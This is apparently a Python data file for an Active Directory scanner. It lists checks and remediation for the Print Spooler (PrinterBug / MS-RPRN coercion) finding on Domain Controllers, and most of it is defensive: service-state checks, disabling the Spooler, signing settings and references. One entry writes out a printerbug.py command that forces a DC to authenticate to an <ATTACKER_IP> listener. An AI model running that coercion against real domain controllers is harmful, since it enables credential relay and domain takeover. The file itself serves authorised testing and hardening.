"""
verifications/verify_print_spooler.py
Manual Verification and Remediation data for ADScan findings matching:
Print Spooler service on Domain Controllers (PrinterBug / MS-RPRN coercion)
"""

MATCH_KEYS = [
    "print spooler",
    "printerbug",
    "spooler service",
]

TOOLS = [
    {
        "tool": "NetExec",
        "icon": "netexec",
        "desc": (
            "Use the NetExec spooler module to test whether the MS-RPRN interface is "
            "reachable on each Domain Controller."
        ),
        "code": (
            "nxc smb <DC_IP> \\\n"
            "  -d <domain> \\\n"
            "  -u <username> \\\n"
            "  -p <password> \\\n"
            "  -M spooler"
        ),
        "confirm": (
            "A line reading <code>Spooler service enabled</code> confirms the DC is "
            "coercible via PrinterBug. <code>Spooler service disabled</code> means the "
            "service is not reachable and the DC is not affected."
        ),
    },
    {
        "tool": "Impacket (rpcdump)",
        "icon": "impacket",
        "desc": (
            "Confirm the MS-RPRN endpoint is registered on the DC. The presence of the "
            "Spooler (spoolss) interface indicates the service is running."
        ),
        "code": "rpcdump.py <domain>/<username>:<password>@<DC_IP> | grep -i 'MS-RPRN\\|spoolss'",
        "confirm": (
            "Any returned MS-RPRN / spoolss binding means the Print Spooler is exposed. "
            "No output means the interface is not registered."
        ),
    },
    {
        "tool": "PrinterBug (dementor / printerbug.py)",
        "icon": "impacket",
        "desc": (
            "Optional active proof: trigger the coercion against a listener you control "
            "(only in an authorised assessment). The DC will attempt to authenticate to "
            "the attacker host."
        ),
        "code": "printerbug.py <domain>/<username>:<password>@<DC_IP> <ATTACKER_IP>",
        "confirm": (
            "Incoming SMB/HTTP authentication from the DC machine account "
            "(<code>DC01$</code>) at your listener confirms exploitability. "
            "Do not run this without explicit authorisation."
        ),
    },
    {
        "tool": "PowerShell",
        "icon": "ps",
        "desc": (
            "Check the Spooler service state directly on each Domain Controller. "
            "<strong>Run PowerShell as Administrator.</strong>"
        ),
        "code": (
            "Get-ADDomainController -Filter * | ForEach-Object {\n"
            "    Get-Service -ComputerName $_.HostName -Name Spooler |\n"
            "      Select-Object @{N='DC';E={$_.MachineName}}, Status, StartType\n"
            "}"
        ),
        "confirm": (
            "Any DC reporting <strong>Status = Running</strong> for the Spooler service is "
            "affected. The service should be Stopped and Disabled on all DCs."
        ),
    },
]

REMEDIATION = {
    "title": "Disable the Print Spooler service on all Domain Controllers",
    "steps": [
        {
            "text": (
                "Stop and disable the Print Spooler on every Domain Controller. It is "
                "almost never required on a DC, and disabling it removes the PrinterBug "
                "coercion primitive entirely:"
            ),
            "code": (
                "# Run on each DC (or remotely via Invoke-Command):\n"
                "Stop-Service -Name Spooler -Force\n"
                "Set-Service -Name Spooler -StartupType Disabled"
            ),
        },
        {
            "text": (
                "Enforce centrally with Group Policy so the setting cannot drift back. "
                "Apply to the Domain Controllers OU:"
            ),
            "code": (
                "# Computer Configuration > Policies > Administrative Templates >\n"
                "#   Printers > 'Allow Print Spooler to accept client connections' = Disabled\n"
                "# (Also consider disabling the Spooler service via GPO Preferences / Services.)"
            ),
        },
        {
            "text": (
                "Break the coercion-to-relay chain as defence in depth: enforce SMB signing, "
                "LDAP signing and LDAP channel binding, and (if AD CS is present) require HTTPS "
                "with Extended Protection for Authentication on the Web Enrollment endpoint to "
                "mitigate ESC8."
            ),
        },
        {
            "text": (
                "Re-run the NetExec spooler module against each DC to confirm the service is "
                "no longer reachable:"
            ),
            "code": "nxc smb <DC_IP> -d <domain> -u <username> -p <password> -M spooler",
        },
    ],
}

REFERENCES = [
    {
        "title": "MS-RPRN: Print System Remote Protocol — Microsoft Docs",
        "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1",
        "tag": "vendor",
    },
    {
        "title": "SpoolSample / PrinterBug (Lee Christensen)",
        "url": "https://github.com/leechristensen/SpoolSample",
        "tag": "tool",
    },
    {
        "title": "printerbug.py — Impacket-based coercion (Dirk-jan Mollema)",
        "url": "https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py",
        "tag": "tool",
    },
    {
        "title": "Certified Pre-Owned — AD CS Abuse (ESC8 relay) — SpecterOps",
        "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        "tag": "research",
    },
    {
        "title": "MITRE ATT&CK: Forced Authentication (T1187)",
        "url": "https://attack.mitre.org/techniques/T1187/",
        "tag": "attack",
    },
    {
        "title": "MITRE ATT&CK: Adversary-in-the-Middle — LLMNR/NBT-NS / Relay (T1557.001)",
        "url": "https://attack.mitre.org/techniques/T1557/001/",
        "tag": "attack",
    },
]
